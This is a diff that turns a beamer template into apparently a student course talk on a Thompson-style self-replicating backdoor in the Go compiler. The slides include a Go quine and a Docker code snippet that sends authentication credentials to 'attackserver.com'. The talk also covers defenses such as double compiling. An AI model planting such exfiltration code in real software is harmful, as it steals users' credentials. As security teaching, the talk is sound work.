@@ -1,30 +1,5 @@
-% !TEX TS-program = pdflatex
-% !TEX encoding = UTF-8 Unicode
-
-% This file is a template using the "beamer" package to create slides for a talk or presentation
-% - Giving a talk on some subject.
-% - The talk is between 15min and 45min long.
-% - Style is ornate.
-
-% MODIFIED by Jonathan Kew, 2008-07-06
-% The header comments and encoding in this file were modified for inclusion with TeXworks.
-% The content is otherwise unchanged from the original distributed with the beamer package.
 
 \documentclass{beamer}
-
-
-% Copyright 2004 by Till Tantau <tantau@users.sourceforge.net>.
-%
-% In principle, this file can be redistributed and/or modified under
-% the terms of the GNU Public License, version 2.
-%
-% However, this file is supposed to be a template to be modified
-% for your own needs. For this reason, if you use this file as a
-% template and not specifically distribute it as part of a another
-% package/program, I grant the extra permission to freely copy and
-% modify this file as you see fit and even to delete this copyright
-% notice. 
-
 
 \mode<presentation>
 {
@@ -44,65 +19,35 @@
 
 \usepackage{times}
 \usepackage[T1]{fontenc}
-% Or whatever. Note that the encoding and the font should match. If T1
-% does not look nice, try deleting the line with the fontenc.
 
-
-\title[Short Paper Title] % (optional, use only with long paper titles)
-{Presentation Title}
+\title[Gogojuice] % (optional, use only with long paper titles)
+{Gogojuice: Reflections on Trusting Trust}
 
 \subtitle
-{Presentation Subtitle} % (optional)
+{An analysis of compiler-based attacks} % (optional)
 
-\author[Author, Another] % (optional, use only with lots of authors)
-{F.~Author\inst{1} \and S.~Another\inst{2}}
+\author %[Author, Another] % (optional, use only with lots of authors)
+{Jeffrey Ling \and Rachit Singh}
 % - Use the \inst{?} command only if the authors have different
 %   affiliation.
 
-\institute[Universities of Somewhere and Elsewhere] % (optional, but mostly needed)
+\institute[CS 263 '15] % (optional, but mostly needed)
 {
-  \inst{1}%
-  Department of Computer Science\\
-  University of Somewhere
-  \and
-  \inst{2}%
-  Department of Theoretical Philosophy\\
-  University of Elsewhere}
+  CS 263 '15}
 % - Use the \inst command only if there are several affiliations.
 % - Keep it simple, no one is interested in your street address.
 
-\date[Short Occasion] % (optional)
-{Date / Occasion}
+\date %[Short Occasion] % (optional)
+{December 1, 2015}
 
-\subject{Talks}
+%\subject{Talks}
 % This is only inserted into the PDF information catalog. Can be left
 % out. 
-
-
-
-% If you have a file called "university-logo-filename.xxx", where xxx
-% is a graphic format that can be processed by latex or pdflatex,
-% resp., then you can add a logo as follows:
-
-% \pgfdeclareimage[height=0.5cm]{university-logo}{university-logo-filename}
-% \logo{\pgfuseimage{university-logo}}
-
-
-
-% Delete this, if you do not want the table of contents to pop up at
-% the beginning of each subsection:
-\AtBeginSubsection[]
-{
-  \begin{frame}<beamer>{Outline}
-    \tableofcontents[currentsection,currentsubsection]
-  \end{frame}
-}
-
 
 % If you wish to uncover everything in a step-wise fashion, uncomment
 % the following command: 
 
-%\beamerdefaultoverlayspecification{<+->}
+\beamerdefaultoverlayspecification{<+->}
 
 
 \begin{document}
@@ -111,106 +56,117 @@
   \titlepage
 \end{frame}
 
-\begin{frame}{Outline}
-  \tableofcontents
+%\begin{frame}{Outline}
+ % \tableofcontents
   % You might wish to add the option [pausesections]
-\end{frame}
+%\end{frame}
 
 
-% Since this a solution template for a generic talk, very little can
-% be said about how it should be structured. However, the talk length
-% of between 15min and 45min and the theme suggest that you stick to
-% the following rules:  
-
-% - Exactly two or three sections (other than the summary).
-% - At *most* three subsections per section.
-% - Talk about 30s to 2min per frame. So there should be between about
-%   15 and 30 frames, all told.
-
-\section{Introduction}
-
-\subsection[Short First Subsection Name]{First Subsection Name}
-
-\begin{frame}{Make Titles Informative. Use Uppercase Letters.}{Subtitles are optional.}
+\begin{frame}{Compiler-Based Attacks} %{Subtitles are optional.}
   % - A title should summarize the slide in an understandable fashion
   %   for anyone how does not follow everything on the slide itself.
 
   \begin{itemize}
-  \item
-    Use \texttt{itemize} a lot.
-  \item
-    Use very short sentences or short phrases.
+  \item An idea originally proposed by Ken Thompson (1984)
+  \item The compiler will \dots
+	\begin{itemize}
+		\item inject malicious code into programs it compiles
+		\pause
+		\item inject a version of \emph{itself} if it compiles itself, thus making the compiler self-replicating
+	\end{itemize}
   \end{itemize}
 \end{frame}
 
-\begin{frame}{Make Titles Informative.}
+\begin{frame}{Our Project}
+	\begin{figure}
+	\centering
+	\includegraphics[scale=0.2]{gopher}
+	\end{figure}
+	We implemented Ken Thompson's attack on the open source Go compiler.
+\end{frame}
 
-  You can create overlays\dots
-  \begin{itemize}
-  \item using the \texttt{pause} command:
-    \begin{itemize}
-    \item
-      First item.
-      \pause
-    \item    
-      Second item.
-    \end{itemize}
-  \item
-    using overlay specifications:
-    \begin{itemize}
-    \item<3->
-      First item.
-    \item<4->
-      Second item.
-    \end{itemize}
-  \item
-    using the general \texttt{uncover} command:
-    \begin{itemize}
-      \uncover<5->{\item
-        First item.}
-      \uncover<6->{\item
-        Second item.}
-    \end{itemize}
-  \end{itemize}
+\begin{frame}{Quine}
+	How do we make the compiler self-replicating?
+
+\medskip
+
+	 Using a \emph{quine} %% want to make this pop up but not sure how
+
 \end{frame}
 
 
-\subsection{Second Subsection}
+\begin{frame}[fragile]{Quine}
+A quine in Go:
 
-\begin{frame}{Make Titles Informative.}
+\begin{figure}
+\centering
+\tiny
+\begin{verbatim}
+package main
+
+import "fmt"
+
+func main() {
+  s := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := %#v\n\tfmt.Printf(s, s)\n}\n"
+  fmt.Printf(s, s)
+}
+\end{verbatim}
+\end{figure}
+\normalsize
 \end{frame}
 
-\begin{frame}{Make Titles Informative.}
+\begin{frame}{Attacks}
+
+We implemented the following attacks on the Go standard library:
+\begin{itemize}
+\item Fixed the \texttt{math/rand} seed to be constant
+\item Fixed the \texttt{crypto/sha256} hash function to be constant
+\end{itemize}
+
 \end{frame}
 
+\begin{frame}[fragile]{Attacks}
+\begin{figure}
+\centering
+\includegraphics[scale=0.2]{docker}
+\end{figure}
 
+We also injected code into Docker, a container platform built in Go, to send authentication keys to a remote server.
+\tiny
+\begin{verbatim}
+// this is a nice JSON structure containing username, password, etc.
+var data = fmt.Sprintf("%#v", authConfig) 
+resp, err := http.Get("http://attackserver.com?data=" + data)
+\end{verbatim}
+\normalsize
+\end{frame}
 
-\section*{Summary}
+\begin{frame}{Defenses}
+How do we defend against a compiler that is self-replicating?
+\begin{itemize}
+\item Double compiling
+\item Examining the raw binary for quine traces
+\item Proper testing
+\end{itemize}
+\end{frame}
 
 \begin{frame}{Summary}
 
-  % Keep the summary *very short*.
+  % need some help here
+In this project we\dots
   \begin{itemize}
-  \item
-    The \alert{first main message} of your talk in one or two lines.
-  \item
-    The \alert{second main message} of your talk in one or two lines.
-  \item
-    Perhaps a \alert{third message}, but not more than that.
+  \item Wrote gogojuice, a Go compiler that replicates itself
+  \item Investigated attacks on the Go standard library and open source code
   \end{itemize}
+
+% want to make this pop up too
+\alert{Moral}: open source and the Internet can make trust deadly - once a compiler infected it never dies!
   
-  % The following outlook is optional.
-  \vskip0pt plus.5fill
-  \begin{itemize}
-  \item
-    Outlook
-    \begin{itemize}
-    \item
-      Something you haven't solved.
-    \item
-      Something else you haven't solved.
-    \end{itemize}
-  \end{itemize}
+\end{frame}
+
+\begin{frame}
+\Huge
+Thanks!
 \end{frame}
 
 
